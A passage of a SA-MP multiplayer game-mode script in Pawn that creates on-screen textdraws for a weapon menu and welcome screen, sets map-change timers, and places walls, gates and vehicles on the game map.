Gunstxd[4] = TextDrawCreate(437.999938, 119.813339, "box");
TextDrawLetterSize(Gunstxd[4], 0.000000, 10.239999);
TextDrawTextSize(Gunstxd[4], 596.000000, 0.000000);
TextDrawAlignment(Gunstxd[4], 1);
TextDrawColor(Gunstxd[4], -1);
TextDrawUseBox(Gunstxd[4], 1);
TextDrawBoxColor(Gunstxd[4], 40);
TextDrawSetShadow(Gunstxd[4], 0);
TextDrawSetOutline(Gunstxd[4], 0);
TextDrawBackgroundColor(Gunstxd[4], 255);
TextDrawFont(Gunstxd[4], 1);
TextDrawSetProportional(Gunstxd[4], 1);
TextDrawSetShadow(Gunstxd[4], 0);

Gunstxd[5] = TextDrawCreate(43.599952, 229.573410, "box");
TextDrawLetterSize(Gunstxd[5], 0.000000, 10.239999);
TextDrawTextSize(Gunstxd[5], 201.000000, 0.000000);
TextDrawAlignment(Gunstxd[5], 1);
TextDrawColor(Gunstxd[5], -1);
TextDrawUseBox(Gunstxd[5], 1);
TextDrawBoxColor(Gunstxd[5], 40);
TextDrawSetShadow(Gunstxd[5], 0);
TextDrawSetOutline(Gunstxd[5], 0);
TextDrawBackgroundColor(Gunstxd[5], 255);
TextDrawFont(Gunstxd[5], 1);
TextDrawSetProportional(Gunstxd[5], 1);
TextDrawSetShadow(Gunstxd[5], 0);

Gunstxd[6] = TextDrawCreate(441.199768, 229.573318, "box");
TextDrawLetterSize(Gunstxd[6], 0.000000, 10.239999);
TextDrawTextSize(Gunstxd[6], 601.000000, 0.000000);
TextDrawAlignment(Gunstxd[6], 1);
TextDrawColor(Gunstxd[6], -1);
TextDrawUseBox(Gunstxd[6], 1);
TextDrawBoxColor(Gunstxd[6], 40);
TextDrawSetShadow(Gunstxd[6], 0);
TextDrawSetOutline(Gunstxd[6], 0);
TextDrawBackgroundColor(Gunstxd[6], 255);
TextDrawFont(Gunstxd[6], 1);
TextDrawSetProportional(Gunstxd[6], 1);
TextDrawSetShadow(Gunstxd[6], 0);

Gunstxd[7] = TextDrawCreate(245.199966, 231.066757, "box");
TextDrawLetterSize(Gunstxd[7], 0.000000, 10.239999);
TextDrawTextSize(Gunstxd[7], 402.000000, 0.000000);
TextDrawAlignment(Gunstxd[7], 1);
TextDrawColor(Gunstxd[7], -1);
TextDrawUseBox(Gunstxd[7], 1);
TextDrawBoxColor(Gunstxd[7], 40);
TextDrawSetShadow(Gunstxd[7], 0);
TextDrawSetOutline(Gunstxd[7], 0);
TextDrawBackgroundColor(Gunstxd[7], 255);
TextDrawFont(Gunstxd[7], 1);
TextDrawSetProportional(Gunstxd[7], 1);
TextDrawSetShadow(Gunstxd[7], 0);

Gunstxd[8] = TextDrawCreate(102.000045, 119.066619, "AK-47");
TextDrawLetterSize(Gunstxd[8], 0.400000, 1.600000);
TextDrawAlignment(Gunstxd[8], 1);
TextDrawColor(Gunstxd[8], -1);
TextDrawSetShadow(Gunstxd[8], 0);
TextDrawSetOutline(Gunstxd[8], 0);
TextDrawBackgroundColor(Gunstxd[8], 255);
TextDrawFont(Gunstxd[8], 1);
TextDrawSetProportional(Gunstxd[8], 1);
TextDrawSetShadow(Gunstxd[8], 0);

Gunstxd[9] = TextDrawCreate(317.199981, 118.319961, "M4");
TextDrawLetterSize(Gunstxd[9], 0.400000, 1.600000);
TextDrawAlignment(Gunstxd[9], 1);
TextDrawColor(Gunstxd[9], -1);
TextDrawSetShadow(Gunstxd[9], 0);
TextDrawSetOutline(Gunstxd[9], 0);
TextDrawBackgroundColor(Gunstxd[9], 255);
TextDrawFont(Gunstxd[9], 1);
TextDrawSetProportional(Gunstxd[9], 1);
TextDrawSetShadow(Gunstxd[9], 0);

Gunstxd[10] = TextDrawCreate(503.600158, 118.319961, "Rifle");
TextDrawLetterSize(Gunstxd[10], 0.400000, 1.600000);
TextDrawAlignment(Gunstxd[10], 1);
TextDrawColor(Gunstxd[10], -1);
TextDrawSetShadow(Gunstxd[10], 0);
TextDrawSetOutline(Gunstxd[10], 0);
TextDrawBackgroundColor(Gunstxd[10], 255);
TextDrawFont(Gunstxd[10], 1);
TextDrawSetProportional(Gunstxd[10], 1);
TextDrawSetShadow(Gunstxd[10], 0);

Gunstxd[11] = TextDrawCreate(104.400138, 230.319976, "MP5");
TextDrawLetterSize(Gunstxd[11], 0.400000, 1.600000);
TextDrawAlignment(Gunstxd[11], 1);
TextDrawColor(Gunstxd[11], -1);
TextDrawSetShadow(Gunstxd[11], 0);
TextDrawSetOutline(Gunstxd[11], 0);
TextDrawBackgroundColor(Gunstxd[11], 255);
TextDrawFont(Gunstxd[11], 1);
TextDrawSetProportional(Gunstxd[11], 1);
TextDrawSetShadow(Gunstxd[11], 0);

Gunstxd[12] = TextDrawCreate(299.600311, 231.813278, "ShotGun");
TextDrawLetterSize(Gunstxd[12], 0.400000, 1.600000);
TextDrawAlignment(Gunstxd[12], 1);
TextDrawColor(Gunstxd[12], -1);
TextDrawSetShadow(Gunstxd[12], 0);
TextDrawSetOutline(Gunstxd[12], 0);
TextDrawBackgroundColor(Gunstxd[12], 255);
TextDrawFont(Gunstxd[12], 1);
TextDrawSetProportional(Gunstxd[12], 1);
TextDrawSetShadow(Gunstxd[12], 0);

Gunstxd[13] = TextDrawCreate(578.799926, 233.306701, "Sawn off shotgun");
TextDrawLetterSize(Gunstxd[13], 0.400000, 1.600000);
TextDrawAlignment(Gunstxd[13], 3);
TextDrawColor(Gunstxd[13], -1);
TextDrawSetShadow(Gunstxd[13], 0);
TextDrawSetOutline(Gunstxd[13], 0);
TextDrawBackgroundColor(Gunstxd[13], 255);
TextDrawFont(Gunstxd[13], 1);
TextDrawSetProportional(Gunstxd[13], 1);
TextDrawSetShadow(Gunstxd[13], 0);


Amar1 = TextDrawCreate(5.000000, 320.000000, "Server Amar --------------");
TextDrawBackgroundColor(Amar1, 255);
TextDrawFont(Amar1, 1);
TextDrawLetterSize(Amar1, 0.419999, 1.000000);
TextDrawColor(Amar1, -1);
TextDrawSetOutline(Amar1, 0);
TextDrawSetProportional(Amar1, 1);
TextDrawSetShadow(Amar1, 1);
TextDrawSetSelectable(Amar1, 0);

Amar2 = TextDrawCreate(5.000000, 308.000000, "Server Amar --------------");
TextDrawBackgroundColor(Amar2, 255);
TextDrawFont(Amar2, 1);
TextDrawLetterSize(Amar2, 0.419999, 1.000000);
TextDrawColor(Amar2, -1);
TextDrawSetOutline(Amar2, 0);
TextDrawSetProportional(Amar2, 1);
TextDrawSetShadow(Amar2, 1);
TextDrawSetSelectable(Amar2, 0);

Amar3 = TextDrawCreate(5.000000, 296.000000, "Server Amar --------------");
TextDrawBackgroundColor(Amar3, 255);
TextDrawFont(Amar3, 1);
TextDrawLetterSize(Amar3, 0.419999, 1.000000);
TextDrawColor(Amar3, -1);
TextDrawSetOutline(Amar3, 0);
TextDrawSetProportional(Amar3, 1);
TextDrawSetShadow(Amar3, 1);
TextDrawSetSelectable(Amar3, 0);
	tdw0 = TextDrawCreate(716.000000, -6.000000, "a");
TextDrawBackgroundColor(tdw0, 255);
TextDrawFont(tdw0, 1);
TextDrawLetterSize(tdw0, 200.000000, 200.000000);
TextDrawColor(tdw0, -1);
TextDrawSetOutline(tdw0, 0);
TextDrawSetProportional(tdw0, 1);
TextDrawSetShadow(tdw0, 1);
TextDrawUseBox(tdw0, 1);
TextDrawBoxColor(tdw0, 255);
TextDrawTextSize(tdw0, 370.000000, 18.000000);
TextDrawSetSelectable(tdw0, 0);
tdw8= TextDrawCreate(624.000000, -2.000000, "a");
TextDrawBackgroundColor(Textdraw8, 255);
TextDrawFont(tdw8, 1);
TextDrawLetterSize(tdw8, 20.000000, 20.000000);
TextDrawColor(tdw8, 255);
TextDrawSetOutline(tdw8, 0);
TextDrawSetProportional(tdw8, 1);
TextDrawSetShadow(tdw8, 1);
TextDrawUseBox(tdw8, 1);
TextDrawBoxColor(tdw8, 255);
TextDrawTextSize(tdw8, 0.000000, 0.000000);
TextDrawSetSelectable(tdw8, 0);

tdw1 = TextDrawCreate(-25.000000, -15.000000, "a");
TextDrawBackgroundColor(tdw1, 255);
TextDrawFont(tdw1, 1);
TextDrawLetterSize(tdw1, 3000.000000, 3000.000000);
TextDrawColor(tdw1, 255);
TextDrawSetOutline(tdw1, 0);
TextDrawSetProportional(tdw1, 1);
TextDrawSetShadow(tdw1, 1);
TextDrawUseBox(tdw1, 1);
TextDrawBoxColor(tdw1, 255);
TextDrawTextSize(tdw1, 0.000000, 0.000000);
TextDrawSetSelectable(tdw1, 0);

tdw2 = TextDrawCreate(250.000000, 1.000000, "a");
TextDrawBackgroundColor(tdw2, 255);
TextDrawFont(tdw2, 1);
TextDrawLetterSize(tdw2, 3000.000000, 3000.000000);
TextDrawColor(tdw2, 255);
TextDrawSetOutline(tdw2, 0);
TextDrawSetProportional(tdw2, 1);
TextDrawSetShadow(tdw2, 1);
TextDrawUseBox(tdw2, 1);
TextDrawBoxColor(tdw2, 255);
TextDrawTextSize(tdw2, 0.000000, 0.000000);
TextDrawSetSelectable(tdw2, 0);

tdw3 = TextDrawCreate(391.000000, 350.000000, "a");
TextDrawBackgroundColor(tdw3, 255);
TextDrawFont(tdw3, 1);
TextDrawLetterSize(tdw3, 500.000000, 200.000000);
TextDrawColor(tdw3, -1);
TextDrawSetOutline(tdw3, 0);
TextDrawSetProportional(tdw3, 1);
TextDrawSetShadow(tdw3, 1);
TextDrawUseBox(tdw3, 1);
TextDrawBoxColor(tdw3, 255);
TextDrawTextSize(tdw3, 0.000000, 0.000000);
TextDrawSetSelectable(tdw3, 0);

tdw4 = TextDrawCreate(737.000000, 1.000000, "a");
TextDrawBackgroundColor(tdw4, 255);
TextDrawFont(tdw4, 1);
TextDrawLetterSize(tdw4, 20.000000, 20.000000);
TextDrawColor(tdw4, 255);
TextDrawSetOutline(tdw4, 0);
TextDrawSetProportional(tdw4, 1);
TextDrawSetShadow(tdw4, 1);
TextDrawUseBox(tdw4, 1);

tdw5 = TextDrawCreate(225.000000, 170.000000, "Scripter: [IT]_LuG");
TextDrawBackgroundColor(tdw5, 255);
TextDrawFont(tdw5, 3);
TextDrawLetterSize(tdw5, 0.500000, 1.000000);
TextDrawColor(tdw5, -1);
TextDrawSetOutline(tdw5, 0);
TextDrawSetProportional(tdw5, 1);
TextDrawSetShadow(tdw5, 1);
TextDrawSetSelectable(tdw5, 0);

tdw6 = TextDrawCreate(80.000000, 224.000000, "Sponser: Sa-mp.com");
TextDrawBackgroundColor(tdw6, 255);
TextDrawFont(tdw6, 3);
TextDrawLetterSize(tdw6, 0.500000, 1.000000);
TextDrawColor(tdw6, -1);
TextDrawSetOutline(tdw6, 0);
TextDrawSetProportional(tdw6, 1);
TextDrawSetShadow(tdw6, 1);
TextDrawSetSelectable(tdw6, 0);

tdw7 = TextDrawCreate(260.000000, 360.000000, "Welcome");
TextDrawBackgroundColor(tdw7, 255);
TextDrawFont(tdw7, 2);
TextDrawLetterSize(tdw7, 0.500000, 1.000000);
TextDrawColor(tdw7, -1);
TextDrawSetOutline(tdw7, 0);
TextDrawSetProportional(tdw7, 1);
TextDrawSetShadow(tdw7, 1);
TextDrawSetSelectable(tdw7, 0);


	SetGameModeText("Minigames/TDM/DM/ZOMBIE");
	UsePlayerPedAnims();
    DisableInteriorEnterExits();

SetTimer("NewMapTimer",900000,true);         
MapChange= 0;
//background
SetTimer("SendMSG", 30000, true);
//anticheat
print("\nAnti-Cheat Loaded\n");


SetTimer("CheckMoney",2000,true);
AddPlayerClass(20034,-2231.9927,-1738.3254,480.9386,40.2344,0,0,0,0,0,0); // ctmp1

AddPlayerClass(20033,-2231.9927,-1738.3254,480.9386,40.2344,0,0,0,0,0,0); // ctmp2fix
AddPlayerClass(20035,-2231.9927,-1738.3254,480.9386,40.2344,0,0,0,0,0,0); // ctmp1

AddPlayerClass(20036,-2231.9927,-1738.3254,480.9386,40.2344,0,0,0,0,0,0);


    //----
    
g_Object[0] = CreateObject(19355, -2615.9467, 1353.4372, 7.7940, 0.0000, 0.0000, 0.0000); //wall003
g_Object[1] = CreateObject(19355, -2615.9467, 1351.3580, 7.7940, 0.0000, 0.0000, 0.0000); //wall003
g_Object[2] = CreateObject(19355, -2615.9467, 1348.1673, 7.7940, 0.0000, 0.0000, 0.0000); //wall003
g_Object[3] = CreateObject(19355, -2615.9467, 1344.9963, 7.7940, 0.0000, 0.0000, 0.0000); //wall003
g_Object[4] = CreateObject(19355, -2615.9467, 1343.9461, 7.7940, 0.0000, 0.0000, 0.0000); //wall003
g_Object[5] = CreateObject(19355, -2617.0808, 1341.1893, 7.7940, 0.0000, 0.0000, -43.4000); //wall003
g_Object[6] = CreateObject(19355, -2619.2885, 1338.8985, 7.7940, 0.0000, 0.0000, -45.1000); //wall003
g_Object[7] = CreateObject(19355, -2621.4709, 1336.7103, 7.7940, 0.0000, 0.0000, -45.1000); //wall003
g_Object[8] = CreateObject(19355, -2623.8781, 1334.3106, 7.7940, 0.0000, 0.0000, -45.1000); //wall003
g_Object[9] = CreateObject(19355, -2626.1584, 1332.0375, 7.7940, 0.0000, 0.0000, -45.1000); //wall003
g_Object[10] = CreateObject(19355, -2626.4770, 1331.7200, 7.7940, 0.0000, 0.0000, -45.1000); //wall003
g_Object[11] = CreateObject(19355, -2629.2238, 1330.6617, 7.7940, 0.0000, 0.0000, -90.9000); //wall003
g_Object[12] = CreateObject(19355, -2632.4753, 1330.7119, 7.7940, 0.0000, 0.0000, -90.9000); //wall003
g_Object[13] = CreateObject(19355, -2635.5268, 1330.7601, 7.7940, 0.0000, 0.0000, -90.9000); //wall003
g_Object[14] = CreateObject(19355, -2639.0961, 1330.8164, 7.7940, 0.0000, 0.0000, -90.9000); //wall003
g_Object[15] = CreateObject(19355, -2642.2768, 1330.8665, 7.7940, 0.0000, 0.0000, -90.9000); //wall003
g_Object[16] = CreateObject(19355, -2645.2368, 1330.9033, 7.7940, 0.0000, 0.0000, -90.9000); //wall003
g_Object[17] = CreateObject(19355, -2646.3879, 1330.9207, 7.7940, 0.0000, 0.0000, -90.9000); //wall003
g_Object[18] = CreateObject(19355, -2647.8310, 1332.4487, 7.7940, 0.0000, 0.0000, -3.8000); //wall003
g_Object[19] = CreateObject(19355, -2647.6596, 1335.4552, 7.7940, 0.0000, 0.0000, -3.8000); //wall003
g_Object[20] = CreateObject(19355, -2647.6596, 1335.4552, 7.7940, 0.0000, 0.0000, -3.8000); //wall003
g_Object[21] = CreateObject(19355, -2647.7827, 1338.4499, 7.7940, 0.0000, 0.0000, 10.1999); //wall003
g_Object[22] = CreateObject(19355, -2648.0793, 1341.6075, 7.7940, 0.0000, 0.0000, 1.3999); //wall003
g_Object[23] = CreateObject(19355, -2648.1552, 1344.7164, 7.7940, 0.0000, 0.0000, 1.3999); //wall003
g_Object[24] = CreateObject(19355, -2648.2321, 1347.8658, 7.7940, 0.0000, 0.0000, 1.3999); //wall003
g_Object[25] = CreateObject(19355, -2648.3100, 1351.0551, 7.7940, 0.0000, 0.0000, 1.3999); //wall003
g_Object[26] = CreateObject(19355, -2648.3100, 1351.0551, 7.7940, 0.0000, 0.0000, 1.3999); //wall003
g_Object[27] = CreateObject(19355, -2648.3442, 1354.0952, 7.7940, 0.0000, 0.0000, -0.1000); //wall003
g_Object[28] = CreateObject(19355, -2648.3400, 1357.2561, 7.7940, 0.0000, 0.0000, -0.1000); //wall003
g_Object[29] = CreateObject(19355, -2649.7602, 1359.4345, 7.8140, 0.0000, 0.0000, -116.4000); //wall003
g_Object[30] = CreateObject(19355, -2651.0312, 1360.0657, 7.8140, 0.0000, 0.0000, -116.4000); //wall003
g_Object[31] = CreateObject(19355, -2637.5312, 1330.8427, 7.8140, 0.0000, 0.0000, -90.9999); //wall003
g_Object[32] = CreateObject(19355, -2623.3020, 1334.8719, 7.7940, 0.0000, 0.0000, 134.2999); //wall003
g_Object[33] = CreateObject(19355, -2655.5126, 1372.9661, 7.7940, 0.0000, 0.0000, 134.2999); //wall003
g_Object[34] = CreateObject(19355, -2653.6818, 1375.0710, 7.7940, 0.0000, 0.0000, 134.2999); //wall003
g_Object[35] = CreateObject(19355, -2651.6235, 1377.2861, 7.7940, 0.0000, 0.0000, 134.2999); //wall003
g_Object[36] = CreateObject(19355, -2649.8581, 1379.0399, 7.7940, 0.0000, 0.0000, 134.2999); //wall003
g_Object[37] = CreateObject(19355, -2647.7534, 1381.0925, 7.7940, 0.0000, 0.0000, 134.2999); //wall003
g_Object[38] = CreateObject(19355, -2645.2382, 1382.3952, 7.7940, 0.0000, 0.0000, 103.4999); //wall003
g_Object[39] = CreateObject(19355, -2642.2487, 1382.4631, 7.7940, 0.0000, 0.0000, 81.3999); //wall003
g_Object[40] = CreateObject(19355, -2639.4331, 1382.0172, 7.7940, 0.0000, 0.0000, 81.3999); //wall003
g_Object[41] = CreateObject(19355, -2636.5732, 1381.6151, 7.7940, 0.0000, 0.0000, 81.3999); //wall003
g_Object[42] = CreateObject(19355, -2633.6589, 1381.1746, 7.7940, 0.0000, 0.0000, 81.3999); //wall003
g_Object[43] = CreateObject(19355, -2630.7121, 1380.7430, 7.7940, 0.0000, 0.0000, 81.1000); //wall003
g_Object[44] = CreateObject(19355, -2628.0322, 1380.3443, 7.7940, 0.0000, 0.0000, 81.1999); //wall003
g_Object[45] = CreateObject(19355, -2624.9321, 1380.0057, 7.7940, 0.0000, 0.0000, 85.3999); //wall003
g_Object[46] = CreateObject(19355, -2621.8820, 1379.8801, 7.7940, 0.0000, 0.0000, 89.7999); //wall003
g_Object[47] = CreateObject(19355, -2618.6696, 1379.9584, 7.7940, 0.0000, 0.0000, 89.7999); //wall003
g_Object[48] = CreateObject(19355, -2617.9689, 1379.9564, 7.7940, 0.0000, 0.0000, 89.7999); //wall003
g_Object[49] = CreateObject(19355, -2616.5598, 1378.4024, 7.7940, 0.0000, 0.0000, -5.6000); //wall003
g_Object[50] = CreateObject(19355, -2616.5683, 1375.2856, 7.7940, 0.0000, 0.0000, 5.3999); //wall003
g_Object[51] = CreateObject(19355, -2616.2736, 1372.1693, 7.7940, 0.0000, 0.0000, 5.3999); //wall003
g_Object[52] = CreateObject(19355, -2615.9733, 1369.0025, 7.7940, 0.0000, 0.0000, 5.3999); //wall003
g_Object[53] = CreateObject(19355, -2616.0791, 1368.6126, 7.7940, 0.0000, 0.0000, 5.3999); //wall003
g_Object[54] = CreateObject(1550, -2646.5190, 1367.5865, 7.4190, 0.0000, 0.0000, 0.0000); //CJ_MONEY_BAG
g_Object[55] = CreateObject(2909, -2644.1484, 1364.5959, 7.3215, 0.0000, 0.0000, 91.1999); //kmb_frontgate
g_Object[56] = CreateObject(2909, -2644.2478, 1369.2060, 7.3215, 0.0000, 0.0000, 91.1999); //kmb_frontgate
g_Object[57] = CreateObject(3749, -2617.2512, 1361.0266, 11.8004, 0.0000, 0.0000, -93.2000); //ClubGate01_LAx
g_Object[58] = CreateObject(11245, -2645.5700, 1357.6356, 9.7017, 0.0000, 0.0000, 0.0000); //sfsefirehseflag
g_Object[59] = CreateObject(19379, -2092.0407, 1364.4959, 5.6019, 0.0000, 0.0000, -122.6999); //wall027
g_Object[60] = CreateObject(19379, -2084.0949, 1359.3955, 5.6019, 0.0000, 0.0000, -122.6999); //wall027
g_Object[61] = CreateObject(19379, -2064.5124, 1346.7294, 5.6019, 0.0000, 0.0000, -122.6999); //wall027
g_Object[62] = CreateObject(3749, -2074.2758, 1354.1853, 11.5254, 0.0000, 0.0000, -36.9000); //ClubGate01_LAx
SetObjectMaterial(g_Object[62], 0, 9514, "711_sfw", "brick", 0xFF840410);
g_Object[63] = CreateObject(969, -2095.8781, 1367.3128, 6.0139, 0.0000, 0.0000, 89.5000); //Electricgate
g_Object[64] = CreateObject(969, -2095.8022, 1376.1831, 6.0139, 0.0000, 0.0000, 89.5000); //Electricgate
g_Object[65] = CreateObject(969, -2095.7268, 1385.0041, 6.0139, 0.0000, 0.0000, 89.5000); //Electricgate
g_Object[66] = CreateObject(969, -2095.7268, 1385.0041, 6.0139, 0.0000, 0.0000, 89.5000); //Electricgate
g_Object[67] = CreateObject(969, -2095.6477, 1393.8636, 6.0139, 0.0000, 0.0000, 89.5000); //Electricgate
g_Object[68] = CreateObject(969, -2095.5717, 1402.6431, 6.0139, 0.0000, 0.0000, 89.5000); //Electricgate
g_Object[69] = CreateObject(969, -2095.4975, 1411.3935, 6.0139, 0.0000, 0.0000, 89.5000); //Electricgate
g_Object[70] = CreateObject(969, -2095.4206, 1420.1420, 6.0139, 0.0000, 0.0000, 89.5000); //Electricgate
g_Object[71] = CreateObject(969, -2095.3549, 1428.0728, 6.0139, 0.0000, 0.0000, 89.5000); //Electricgate
g_Object[72] = CreateObject(969, -2095.2868, 1436.7259, 6.0139, 0.0000, 0.0000, 0.5000); //Electricgate
g_Object[73] = CreateObject(969, -2086.5656, 1436.8032, 6.0139, 0.0000, 0.0000, 0.5000); //Electricgate
g_Object[74] = CreateObject(969, -2077.7453, 1436.8801, 6.0139, 0.0000, 0.0000, 0.5000); //Electricgate
g_Object[75] = CreateObject(969, -2069.4252, 1436.8221, 6.0139, 0.0000, 0.0000, 0.5000); //Electricgate
g_Object[76] = CreateObject(969, -2060.3103, 1436.8267, 6.0139, 0.0000, 0.0000, -91.6999); //Electricgate
g_Object[77] = CreateObject(969, -2060.5463, 1427.9475, 6.0139, 0.0000, 0.0000, -90.1999); //Electricgate
g_Object[78] = CreateObject(969, -2060.6601, 1419.1025, 6.0639, 0.0000, 0.0000, -91.2999); //Electricgate
g_Object[79] = CreateObject(969, -2060.7941, 1410.2935, 6.0639, 0.0000, 0.0000, -90.2999); //Electricgate
g_Object[80] = CreateObject(969, -2060.8745, 1401.4079, 6.0139, 0.0000, 0.0000, -89.5998); //Electricgate
g_Object[81] = CreateObject(969, -2060.8129, 1392.6383, 6.0139, 0.0000, 0.0000, -89.5998); //Electricgate
g_Object[82] = CreateObject(969, -2060.7514, 1383.7783, 6.0139, 0.0000, 0.0000, -89.5998); //Electricgate
g_Object[83] = CreateObject(969, -2060.6906, 1375.0280, 6.0139, 0.0000, 0.0000, -89.5998); //Electricgate
g_Object[84] = CreateObject(969, -2060.6286, 1366.2174, 6.0139, 0.0000, 0.0000, -89.5998); //Electricgate
g_Object[85] = CreateObject(969, -2060.5671, 1357.4670, 6.0139, 0.0000, 0.0000, -89.5998); //Electricgate
g_Object[86] = CreateObject(969, -2060.5351, 1352.8764, 6.0139, 0.0000, 0.0000, -89.5998); //Electricgate
g_Vehicle[4] = CreateVehicle(428, -2644.5012, 1366.6113, 7.2493, 271.2344, 0, 125, -1); //Securicar
g_Vehicle[5] = AddStaticVehicle(428,-2079.9419,1430.4336,7.2266,181.0923,70,108); //Securicar
AddStaticVehicle(522,-2630.9329,1333.7102,6.7686,4.7673,3,8); // prt-n1
AddStaticVehicle(522,-2634.6367,1334.0555,6.7669,6.9829,3,8); // prt-n2
AddStaticVehicle(521,-2619.7163,1350.1339,6.7349,86.9179,75,13); // prt-f1
AddStaticVehicle(521,-2619.6558,1346.6288,6.7558,88.1646,75,13); // prt-f2
AddStaticVehicle(521,-2619.3501,1342.6176,6.7670,88.5472,75,13); // prt-f3
AddStaticVehicle(521,-2619.8044,1378.0658,6.7117,87.1236,75,13); // prt-f4
AddStaticVehicle(521,-2618.5942,1374.4912,6.6814,93.1613,75,13); // prt-f5
AddStaticVehicle(521,-2618.2126,1371.2744,6.6538,89.2250,75,13); // prt-f6
AddStaticVehicle(521,-2628.1196,1377.3459,6.7057,176.9669,75,13); // prt-f7
AddStaticVehicle(521,-2631.8552,1377.9838,6.7111,178.5762,75,13); // prt-f8
AddStaticVehicle(521,-2063.0278,1408.4006,6.6723,84.5871,75,13); // prt-f1
AddStaticVehicle(521,-2063.6599,1405.0846,6.6740,85.1152,75,13); // prt-f2
AddStaticVehicle(521,-2063.5464,1399.0034,6.6733,90.0069,75,13); // prt-f3
AddStaticVehicle(521,-2062.9272,1395.2561,6.6735,88.5735,75,13); // prt-f4
AddStaticVehicle(521,-2063.0542,1392.0173,6.6734,86.4426,75,13); // prt-f5
AddStaticVehicle(521,-2063.2888,1388.5289,6.6668,86.0405,75,13); // prt-f6
AddStaticVehicle(521,-2063.1423,1385.1577,6.6723,91.2059,75,13); // prt-f7
AddStaticVehicle(521,-2062.7087,1381.1011,6.6649,91.9557,75,13); // prt-f8
AddStaticVehicle(521,-2062.5886,1377.7858,6.6727,94.9279,75,13); // prt-f9
AddStaticVehicle(522,-2093.8499,1373.5548,6.6763,276.8761,7,79); // prt-n1
AddStaticVehicle(522,-2093.7476,1377.2528,6.6749,273.5815,7,79); // prt-n2
AddStaticVehicle(522,-2093.0732,1381.7343,6.6750,266.2861,7,79); // prt-n3

//veh
CreateVehicle(447, 100.8595, 2547.7949, 19.9423, 89.8800, -1, -1, 100);
CreateVehicle(447, 101.0028, 2535.1653, 19.9423, 89.8800, -1, -1, 100);
CreateVehicle(425, 88.3288, 2541.3257, 20.5672, 88.6800, -1, -1, 100);
CreateVehicle(520, 178.3381, 2547.7161, 20.5706, 86.8800, -1, -1, 100);
CreateVehicle(520, 177.9173, 2533.8008, 20.5706, 86.8800, -1, -1, 100);
CreateVehicle(521, 286.2034, 2546.2290, 16.2752, -183.0600, -1, -1, 100);
CreateVehicle(522, 290.3305, 2545.4207, 16.2400, -181.6800, -1, -1, 100);
CreateVehicle(521, 294.2318, 2545.7871, 16.2960, -183.0600, -1, -1, 100);
CreateVehicle(522, 298.3647, 2546.4041, 16.2484, -181.6800, -1, -1, 100);
CreateVehicle(521, 288.2389, 2541.4111, 16.2752, -183.0600, -1, -1, 100);
CreateVehicle(522, 292.2123, 2541.4966, 16.2400, -181.6800, -1, -1, 100);
CreateVehicle(521, 296.1946, 2542.0469, 16.2960, -183.0600, -1, -1, 100);
CreateVehicle(468, 293.7888, 2536.7493, 16.3579, -184.9800, -1, -1, 100);
CreateVehicle(468, 284.3847, 2541.3123, 16.3579, -184.9800, -1, -1, 100);
CreateVehicle(468, 290.1504, 2536.8953, 16.3579, -184.9800, -1, -1, 100);
CreateVehicle(468, 286.5697, 2537.4629, 16.3579, -184.9800, -1, -1, 100);
CreateVehicle(468, 298.0598, 2539.5195, 16.3579, -184.9800, -1, -1, 100);
CreateVehicle(432, 320.8171, 2539.9109, 16.6628, -181.0800, -1, -1, 100);
CreateVehicle(432, 330.5436, 2540.2603, 16.6628, -181.0800, -1, -1, 100);
CreateVehicle(469, 365.2727, 2536.6194, 16.6876, 0.0000, -1, -1, 100);
CreateVehicle(487, 348.6131, 2537.4526, 16.7877, 0.0000, -1, -1, 100);
CreateVehicle(470, 384.6144, 2453.9094, 17.1431, -2.0400, -1, -1, 100);
CreateVehicle(470, 390.8996, 2453.5991, 17.1431, -2.0400, -1, -1, 100);
CreateVehicle(470, 397.9208, 2453.5674, 17.1431, -2.0400, -1, -1, 100);
CreateVehicle(470, 405.6418, 2453.0945, 17.1431, -2.0400, -1, -1, 100);
CreateVehicle(470, 413.2962, 2452.8184, 17.1431, -2.0400, -1, -1, 100);
CreateVehicle(470, 420.1294, 2452.6902, 17.1431, -2.0400, -1, -1, 100);
CreateVehicle(490, 415.3133, 2461.8550, 16.8579, 0.0000, -1, -1, 100);
CreateVehicle(490, 405.3152, 2462.2659, 17.0199, 0.0000, -1, -1, 100);
CreateVehicle(490, 394.5629, 2461.6738, 17.0199, 0.0000, -1, -1, 100);
CreateVehicle(490, 385.0340, 2460.8667, 17.0199, 0.0000, -1, -1, 100);
CreateVehicle(548, 381.3176, 2536.8259, 18.1006, 0.0000, -1, -1, 100);
CreateVehicle(476, 426.5379, 2488.5220, 17.4048, 86.8800, -1, -1, 100);
CreateVehicle(476, 427.5444, 2512.1506, 17.4048, 86.8800, -1, -1, 100);
CreateVehicle(411, 271.9991, 2440.9858, 16.0812, 1.2600, -1, -1, 100);
CreateVehicle(411, 287.6519, 2442.3252, 16.0812, 1.2600, -1, -1, 100);
CreateVehicle(411, 303.2556, 2441.5144, 16.0812, 1.2600, -1, -1, 100);
CreateVehicle(415, 296.0645, 2448.8862, 16.1092, 0.0000, -1, -1, 100);
CreateVehicle(415, 278.9313, 2448.0125, 16.1092, 0.0000, -1, -1, 100);
CreateVehicle(451, 301.7250, 2455.9849, 15.9455, 0.0000, -1, -1, 100);
CreateVehicle(451, 287.1246, 2456.3015, 15.9455, 0.0000, -1, -1, 100);
CreateVehicle(451, 272.9698, 2455.5771, 15.9455, 0.0000, -1, -1, 100);
CreateVehicle(541, 295.7055, 2461.1294, 15.9343, 0.0000, -1, -1, 100);
CreateVehicle(541, 279.3770, 2460.6069, 15.9343, 0.0000, -1, -1, 100);
CreateVehicle(540, -1258.8079, 2715.3596, 49.7801, -151.9200, -1, -1, 100);
CreateVehicle(551, -1267.2899, 2710.5420, 49.7550, -152.1000, -1, -1, 100);
CreateVehicle(541, -1307.5890, 2704.8679, 49.5484, -173.1000, -1, -1, 100);
CreateVehicle(541, -1299.8302, 2706.9963, 49.5484, -173.1000, -1, -1, 100);
CreateVehicle(506, -1321.9532, 2701.0688, 49.6515, -153.6600, -1, -1, 100);
CreateVehicle(432, -1472.3131, 2554.9209, 55.5969, 0.0000, -1, -1, 100);
CreateVehicle(432, -1450.5205, 2555.3997, 55.5969, 0.0000, -1, -1, 100);
CreateVehicle(433, -1489.5862, 2643.4341, 55.8955, 0.0000, -1, -1, 100);
CreateVehicle(468, -1400.1003, 2647.3503, 55.2321, 89.8800, -1, -1, 100);
CreateVehicle(468, -1399.9680, 2644.0920, 55.2321, 89.8800, -1, -1, 100);
CreateVehicle(468, -1400.0609, 2640.8279, 55.2321, 89.8800, -1, -1, 100);
CreateVehicle(468, -1399.9978, 2637.4670, 55.2321, 89.8800, -1, -1, 100);
